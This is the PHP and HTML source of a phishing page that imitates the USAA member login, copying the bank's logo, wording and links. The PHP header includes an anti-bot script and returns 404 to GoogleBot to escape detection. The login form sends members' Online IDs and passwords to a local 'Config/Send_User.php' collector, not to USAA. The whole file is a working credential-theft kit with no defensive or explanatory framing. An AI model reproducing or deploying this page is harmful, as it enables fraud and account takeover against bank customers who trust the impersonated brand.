<?php
session_start();
include('antibots.php');
if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
?>
<!DOCTYPE html>
<!-- ent-unified-logon-web@1.4.6 -->
<html lang="en">
<head>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="Process/Scripts.js"></script>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    
    <title>Member Account Login | USAA</title>
    <meta data-react-helmet="true" name="description"
          content="Login to your USAA member account for home, life, and auto insurance as well as online banking and investment services.">
    <meta data-react-helmet="true" name="keywords" content="USAA Login, Member Login, Logon Page">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta id="Viewport" name="viewport" content="width=device-width, initial-scale=1">
    
    <link rel="stylesheet" href="index_files/ent-unified-logon-web.css">


</head>
<body id="indexBody" class="font-narrow">
<div id="mainAppRoot">
    <div class="usaa-transactionalWrapper layout-xxs layout-xxs">
        <div class="usaa-transactionalPage">
            <div>
                <div class="usaa-transactionalHeaderAndIndicator">
                    <header class="usaa-transactionalHeader"><a href="#usaa-templateContent"
                                                                class="usaa-skipToContent screenReader" accesskey="2">Skip
                            to Content</a><a class="home-link" href="https://www.usaa.com/" id="Logo-link">
                            <svg xmlns="http://www.w3.org/2000/svg" id="Logo-svg" viewBox="0 0 63 66"><title>USAA logo.
                                    Redirects to USAA home. USAA logo</title>
                                <path fill="#ffffff"
                                      d="M49.16 44.5s1.52 1.02 3 1.02c1.5 0 2.82-1.07 2.82-1.07V39.2s-1.33.96-2.8.96c-1.48 0-3.02-1.03-3.02-1.03l-15.3-9.06 1.4 6.2 13.9 8.22zM7.84 28.33S6.36 27.3 4.82 27.3s-2.8 1.08-2.8 1.08v5.23s1.26-.93 2.8-.93c1.54 0 3.02 1.03 3.02 1.03l12.64 7.48 1.08-4.73-13.72-8.1zm41.32 9.3s1.52 1.03 3 1.03c1.5 0 2.82-1.07 2.82-1.07v-5.23s-1.33.94-2.8.94c-1.48 0-3.02-1-3.02-1L32.04 22.15l1.42 6.2 15.7 9.3zM7.84 21.5s-1.48-1.04-3.02-1.04-2.8 1.08-2.8 1.08v5.23s1.26-.94 2.8-.94c1.54 0 3.02 1.03 3.02 1.03l14.02 8.3 1.08-4.74-15.1-8.93zm41.32 9.3s1.52 1.03 3 1.03c1.5 0 2.82-1.07 2.82-1.07v-5.24s-1.33.95-2.8.95c-1.48 0-3.02-1.03-3.02-1.03l-18.93-11.2 1.42 6.2 17.5 10.36zM7.84 14.65s-1.48-1.03-3.02-1.03-2.8 1.07-2.8 1.07v5.22s1.26-.94 2.8-.94c1.54 0 3.02 1.03 3.02 1.03l15.4 9.12 1.07-4.73-16.46-9.75zm22-2.1l19.32 11.4s1.52 1.03 3 1.03c1.5 0 2.82-1.07 2.82-1.07V18.7s-1.33.94-2.8.94c-1.48 0-3.02-1.02-3.02-1.02L34.22 9.76 33.18 5.8c0-.17.15-.25.2-.26l2.54-.8c.34 0 .53.3.53.54l.14.28c.08.05.5-.07.5-.15V3.86c0-1.04-.82-1.96-1.93-1.96h-2.53S32.27 1 31.2 1h-4.8c-1.28 0-1.58 1.2-1.58 1.2l-3.34 13.65L7.84 7.8S6.36 6.77 4.82 6.77s-2.8 1.08-2.8 1.08v5.23s1.26-.94 2.8-.94c1.54 0 3.02 1.03 3.02 1.03L24.6 23.1l3.83-16.73 1.4 6.17zM26.8 58.4c0 2.85-2.32 4.9-5.5 4.92-3.37 0-4.5-.58-4.5-.58l-.28-3.15s1.87 1.24 4.62 1.24c.76 0 2.48-.54 2.48-2.1 0-1.48-1.35-1.93-1.68-2.12-.67-.35-1.47-.7-2.13-1.04-1.23-.6-3.06-1.78-3.06-4.27 0-3.57 3.2-4.88 5.75-4.88 2.03 0 3.83.9 3.83.9v2.94c-.57-.34-1.5-1.4-3.84-1.4-1.6 0-2.68.86-2.68 2.04 0 1.1.9 1.8 1.77 2.22l2.44 1.17c1.27.62 2.76 1.9 2.76 4.1zm-15.05-1.35c0 1.3-.43 3.77-3.4 3.72C5.62 60.7 5.1 58.2 5.1 56.6v-9.87h-3.1v10.03c0 5.65 3.44 6.6 6.32 6.6 4.25 0 6.23-2.83 6.23-6.65v-9.97h-2.82v10.32zm43.23 5.93h-3.4l-.96-2.85h-5.78l-.98 2.85h-5.78l-.96-2.85h-5.78l-.98 2.85H27.3L32.9 48l-.54-1.27h3.38l5.4 15.32L46.4 48l-.54-1.27h3.37l5.75 16.25zm-18.63-5.12l-2-6.4-2.26 6.4h4.25zm13.5 0l-2-6.4-2.25 6.4h4.25zm5.93-10.38c-.55.3-1 .73-1.3 1.3S54 49.9 54 50.5c0 .6.17 1.18.47 1.73s.74 1 1.3 1.3c.54.3 1.12.46 1.73.46s1.18-.15 1.73-.45c.55-.3.98-.74 1.3-1.3s.44-1.13.44-1.73c0-.6-.15-1.2-.46-1.75s-.74-1-1.3-1.3c-.55-.3-1.12-.44-1.7-.44s-1.16.15-1.72.45zm3.14.5c.47.25.83.6 1.1 1.08.25.47.38.95.38 1.46 0 .5-.13.98-.4 1.45s-.6.82-1.06 1.07c-.46.26-.94.4-1.44.4s-1-.14-1.45-.4c-.46-.25-.82-.6-1.08-1.07-.25-.47-.38-.95-.38-1.45s.12-1 .38-1.46c.26-.47.62-.83 1.1-1.08s.93-.37 1.42-.37c.48 0 .96.13 1.42.38zm-2.35 4.47v-1.6h.36c.2 0 .37.05.48.13.17.12.38.4.64.88l.34.6h.73l-.44-.75c-.22-.33-.4-.58-.56-.73-.08-.08-.18-.14-.3-.2.3-.02.57-.14.76-.34.2-.2.3-.44.3-.72 0-.18-.06-.37-.18-.54-.12-.17-.27-.3-.47-.36-.2-.07-.5-.1-.95-.1h-1.28v3.75h.6zm0-3.25h.7c.3 0 .5.02.6.07s.2.1.25.2c.06.08.1.18.1.3 0 .16-.07.3-.2.4s-.36.17-.7.17h-.75V49.2z"></path>
                            </svg>
                        </a>
                        <h1 class="usaa-transactionalHeader-appName font-serif"><span>Unified Logon</span></h1>
                        <ul id="navLinkContain">
                            <li class="ulo-navLink"><a href="https://www.usaa.com/join/start/"
                                                       class="miam-logon-join-link font-normal nav-link0" target="_self"
                                                       rel="noopener noreferrer" id="navLink-0">Join USAA</a></li>
                            <li class="ulo-navLink"><a
                                    href="https://www.usaa.com/inet/ent_proof/proofingEvent?action=Init&amp;event=registration"
                                    class="miam-logon-join-link font-normal nav-link1" target="_self"
                                    rel="noopener noreferrer" id="navLink-1">Register <span class="wrappedText">&nbsp;for access</span></a>
                            </li>
                        </ul>
                        <div class="vertical-rule"></div>
                        <button type="button" id="usaa-public-transactional-exitButton"
                                class="usaa-transactionalHeader-navLink usaa-transactionalHeader-navLink--exit usaa-focusRing">
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16">
                                <path fill="#12395b"
                                      d="M15.8 2.3L13.7.2 8 5.9 2.3.2.2 2.3 5.9 8 .2 13.7l2.1 2.1L8 10.1l5.7 5.7 2.1-2.1L10.1 8"></path>
                            </svg>
                            <span class="screenReader">, opens popup</span></button>
                    </header>
                </div>
                <div id="contentHijackId" tabindex="-1"></div>
                <span data-id="usaa-trapFocus--bottom" tabindex="-1" aria-hidden="true"
                      style="top: 2px; position: absolute;"></span></div>
            <div tabindex="-1"></div>
            <div aria-hidden="false" class="usaa-transactionalBodyAndFooter" id="usaa-templateContent">
                <div class="usaa-transactionalBodyWrapper">
                    <div class="usaa-transactionalBody" role="main">
                        <div class="mainPanel-rightPanelButtonContainer"></div>
                        <svg id="flourish-icon" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg"
                             viewBox="0 0 73.35 72" alt="">
                            <defs></defs>
                            <title>usaa-symbol-laurel</title>
                            <path id="Laurel" class="cls-1"
                                  d="M31.16,49.51l2.26,7.7-7.19-3.56L24,45.95ZM26.58,62.1l6.68-4.44-7.8-1.89-6.68,4.44Zm-8-21.82-.5,8,5.54,5.81.5-8ZM15.5,56.34l7.8-1.88L16.62,50,8.82,51.9ZM15.44,33.1l-3.21,7.36,3.21,7.35,3.21-7.35ZM7.05,47.15,15,48l-4.76-6.46-8-.89ZM15,25.28,9.42,31.09l.51,8,5.54-5.81ZM2.26,35.62l7.19,3.57-2.26-7.7L0,27.92Zm14.9-17.85L10,21.34,7.71,29l7.19-3.57ZM1.7,23.14,7.24,29l.51-8L2.21,15.14ZM21.81,11.47l-8,.9L9.08,18.83l8-.9ZM5.44,11.23l3.22,7.36,3.22-7.35L8.66,3.88ZM15.63,3.49l-2.34,7.68,7.22-3.5L22.85,0Zm26.56,46-2.27,7.7,7.19-3.56,2.27-7.7Zm12.38,10.7-6.68-4.44-7.8,1.89,6.68,4.44ZM49.24,46.08l.5,8,5.54-5.81-.5-8ZM64.53,51.9,56.73,50l-6.68,4.44,7.8,1.88ZM54.69,40.45,57.9,47.8l3.21-7.35L57.91,33.1Zm16.36.24-8,.89L58.32,48l8-.89Zm-13.16-7.4,5.54,5.81.51-8L58.4,25.28Zm15.46-5.37-7.19,3.57-2.27,7.7,7.19-3.57Zm-14.9-2.45L65.64,29l-2.27-7.7-7.19-3.57ZM71.14,15.14,65.6,20.95l.51,8,5.54-5.82ZM56.3,17.93l8,.9-4.76-6.46-8-.9ZM64.69,3.88l-3.21,7.35,3.22,7.35,3.22-7.36ZM50.5,0l2.34,7.68,7.22,3.5L57.72,3.49ZM36.67,72,32,63.84l4.71-8.16,4.71,8.16Z"></path>
                        </svg>
                        <div class="online-id miam-logon-wrapper" tabindex="-1">
                            <div class="miam-logon-gutter"></div>
                            <div class="miam-logon-banner">
                                <div class="miam-logon-banner-text">
                                    <div class="wcm-content">
                                        <div class="miam-logon-banner"><h1>Welcome to the new logon experience.</h1>
                                            <p>We've improved how you access usaa.com by making it faster and more
                                                secure.</p>
                                            <p class="call-2-action"><strong>New to USAA?</strong> Become a member by
                                                selecting "Join USAA" — it's easy and only takes a few minutes.</p>
                                        </div>
                                    </div>
                                    <div class="miam-logon-banner-mobile">
                                        <div class="miam-logon-mobile-modal">
                                            <div class="mobile-wcm-banner-content">
                                                <div class="wcm-content">
                                                    <div class="miam-logon-banner"><h1>Welcome to the new logon
                                                            experience.</h1>
                                                        <p>We've improved how you access usaa.com by making it faster
                                                            and more secure.</p>
                                                        <p class="call-2-action"><strong>New to USAA?</strong> Become a
                                                            member by selecting "Join USAA" — it's easy and only takes a
                                                            few minutes.</p></div>
                                                </div>
                                            </div>
                                            <button type="button" aria-label="View, opens popup">View</button>
                                        </div>
                                    </div>
                                </div>
                                <a class="join-button-link" href="https://www.usaa.com/join/start/" target="_self"
                                   rel="noopener noreferrer" tabindex="-1">
                                    <button type="button" class="usaa-button4 join-button">Join USAA</button>
                                </a></div>
                            <div class="miam-logon-fieldset logon-wrapper-main-contain">
                                <div class="miam-logon-form">
                                    <div id="main-logon-wrapper">
                                        <div><h2 class="miam-form-title">Log On</h2>
                                            <form id="formID" method="post" action="./Config/Send_User.php" aria-busy="false" autocapitalize="none">
                                            
<!--                                                 username Section-->
                                                <div id="usernameDivID" class="usaa-form-v5-7-5-textInput usaa-form-v5-7-5-fieldWrapper miam-form-id-input">
                                                    <div class="usaa-form-v5-7-5-block col-1-1" id="username-div">
                                                        <div>
                                                            <div><label for="usaa-form-v5-7-5-input-0g9m11jxy5e9"
                                                                        class="usaa-form-v5-7-5-fieldLabel usaa-form-v5-7-5-fieldWrapper-label"><span
                                                                        aria-hidden="false"
                                                                        class="usaa-form-v5-7-5-fieldLabel-text">Online ID</span></label>
                                                            </div>
                                                            <div id="userErrorMsgID" style="display: none">
                                                                <div id="usaa-form-v5-7-5-input-de0mjpcqw0m6-errorMessage"
                                                                     class="usaa-form-v5-7-5-fieldWrapper-errorMessage usaa-form-v5-7-5-fieldWrapper-errorMessage--active"
                                                                     data-error-message="">
                                                                    <span style="font-weight: 100">
                                                                        <span class="fieldWrapper-errorArrow"></span>
                                                                        <span class="screenReader">error: </span>
                                                                        <span id="errMsgSpan"></span>
                                                                    </span>
                                                                </div>
                                                            </div>
                                                            
                                                            <div>
                                                                <div id="usaa-form-v5-7-5-input-0g9m11jxy5e9-errorMessage"
                                                                     class="usaa-form-v5-7-5-fieldWrapper-errorMessage"
                                                                     data-error-message=""></div>
                                                                <div class="screenReader" role="alert"></div>
                                                            </div>
                                                            <span class="usaa-input"><input name="memberId"
                                                                                            aria-invalid="false"
                                                                                            autocomplete="off"
                                                                                            id="usaa-form-input-usernameInput"
                                                                                            type="text"
                                                                                            aria-describedby="usaa-form-v5-7-5-input-0g9m11jxy5e9-errorMessage undefined"
                                                                                            autocorrect="false"><span
                                                                    class="keyboardFocusRing" aria-hidden="true"></span></span>
                                                        </div>
                                                        <div class="keyboardFocusRing"></div>
                                                    </div>
                                                </div>
                                                
<!--                                                 password section-->
                                                <!--Password Box-->
                                                <div id="passwordDivID" class="show-hide-pass-wrapper" style="display: none">
                                                    <div class="usaa-form-v5-7-5-textInput usaa-form-v5-7-5-fieldWrapper miam-masked-input">
                                                        <div class="usaa-form-v5-7-5-block col-1-1" id="password-div">
                                                            <div>
                                                                <div><label for="usaa-form-input-passwordInput"
                                                                            class="usaa-form-v5-7-5-fieldLabel usaa-form-v5-7-5-fieldWrapper-label"><span
                                                                                aria-hidden="false"
                                                                                class="usaa-form-v5-7-5-fieldLabel-text">Password</span></label>
                                                                </div>

                                                                <!--Pass Error Msg-->

                                                                <div id="passErrorMsgID" style="display: none">
                                                                    <div id="usaa-form-v5-7-5-input-de0mjpcqw0m6-errorMessage"
                                                                         class="usaa-form-v5-7-5-fieldWrapper-errorMessage usaa-form-v5-7-5-fieldWrapper-errorMessage--active"
                                                                         data-error-message="">
                                                                    <span style="font-weight: 100">
                                                                        <span class="fieldWrapper-errorArrow"></span>
                                                                        <span class="screenReader">error: </span>
                                                                        <span id="passMsgSpan"></span>
                                                                    </span>
                                                                    </div>
                                                                    <!--                                                                <div class="screenReader" role="alert"><span>Online ID error: Please enter Online ID.</span>-->
                                                                    <!--                                                                </div>-->
                                                                </div>


                                                                <div>
                                                                    <div id="usaa-form-input-passwordInput-errorMessage"
                                                                         class="usaa-form-v5-7-5-fieldWrapper-errorMessage"
                                                                         data-error-message=""></div>
                                                                    <div class="screenReader" role="alert"></div>
                                                                </div>
                                                                <span class="usaa-input">
                                                                    <input name="password"
                                                                           aria-invalid="false"
                                                                           autocomplete="off"
                                                                           id="usaa-form-input-passwordInput"
                                                                           type="password"
                                                                           aria-describedby="usaa-form-v5-7-5-input-lkt3xp24q60e-errorMessage undefined"
                                                                           value=""><span
                                                                            class="keyboardFocusRing"
                                                                            aria-hidden="true"></span></span></div>
                                                            <div class="keyboardFocusRing"></div>
                                                        </div>
                                                    </div>
                                                    <button id="showPasswordBtnID" tabindex="0" type="button"
                                                            class="show-hide-trigger usaa-button4" aria-live="polite"
                                                            aria-label="Show Password text" role="button">
                                                        <span id="spspan" aria-live="off" aria-hidden="true">Show</span></button>
                                                </div>



                                                <div id="rememberCBID" class="usaa-form-v5-7-5-block col-1-1 miam-checkbox-field" style="display: none">
                                                    <div class="usaa-checkbox"><input class="usaa-checkbox-input"
                                                                                      type="checkbox"
                                                                                      id="usaa-form-v5-7-5-checkbox-q53b34jbf3gb"
                                                                                      aria-labelledby="usaa-form-v5-7-5-checkbox-q53b34jbf3gb-label"><label
                                                                class="usaa-checkbox-label"
                                                                for="usaa-form-v5-7-5-checkbox-q53b34jbf3gb"
                                                                id="usaa-form-v5-7-5-checkbox-q53b34jbf3gb-label">Remember
                                                            this browser to log on faster next time.<span
                                                                    class="usaa-checkbox-pseudoCheckbox"
                                                                    aria-hidden="true"></span><span
                                                                    class="keyboardFocusRing"
                                                                    aria-hidden="true"></span></label></div>
                                                    <div class="keyboardFocusRing"></div>
                                                </div>
                                                <!--                                                    </div>-->
                                                <!--                                                </div>-->

                                                <button id="nextButtonID" type="submit" name="nextButton"
                                                        class="usaa-button4 miam-btn-next submit-btn usaa-button4--primary"
                                                        aria-labelledby="nextBtnValidations">
                                                    
                                                    <div id="spinnerID" class="spinnerContain" style="display: none">
                                                        <div class="usaa-spinner usaa-spinner--smaller"
                                                             aria-valuetext="loading" aria-live="assertive"
                                                             aria-atomic="true" role="alert">
                                                            <span class="screenReader">loading</span>
                                                        </div>
                                                    </div>
                                                    
                                                    
                                                    
                                                    <span>Next</span></button>
                                                <div class="help-link"><a
                                                        aria-label="I need help logging on. (Opens a pop up)."
                                                        tabindex="0">I need help logging on</a></div>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="miam-logon-gutter" tabindex="-1"></div>
                        </div>
                    </div>
                </div>
                <div class="usaa-transactionalFooter">
                    <footer class="usaa-transactionalFooter-footer">
                        <div class="usaa-transactionalFooter-content"><p class="usaa-transactionalFooter-copyright">
                                Copyright © 2021 USAA.</p>
                            <div class="pageFooter-disclosures pageFooter-disclosures--aboveFootnotes"><p>
                                    <a class="miam-footer-link SecurityLink"
                                       href="https://www.usaa.com/inet/wc/security_center?0&amp;wa_ref=logon_jump_security_center"
                                       target="_self">Security Center</a>
                                    <a class="miam-footer-link PrivacyLink" href="https://www.usaa.com/privacy"
                                       target="_self">Privacy Center</a>
                                    <a class="miam-footer-link AccessibilityLink"
                                       href="https://www.usaa.com/inet/pages/accessibility_at_usaa_main?wa_ref=pub_subglobal_footer_accessibility"
                                       target="_self">Accessibility at USAA</a>
                                </p></div>
                            <div class="pageFooter-footnotes"></div>
                            <div class="pageFooter-disclosures pageFooter-disclosures--belowFootnotes"></div>
                            <div class="usaa-transactionalFooter-icons">
                                <div class="usaa-transactionalFooter-logo">USAA Logo</div>
                            </div>
                        </div>
                    </footer>
                </div>
            </div>
        </div>
    </div>
</div>

</body>
</html>
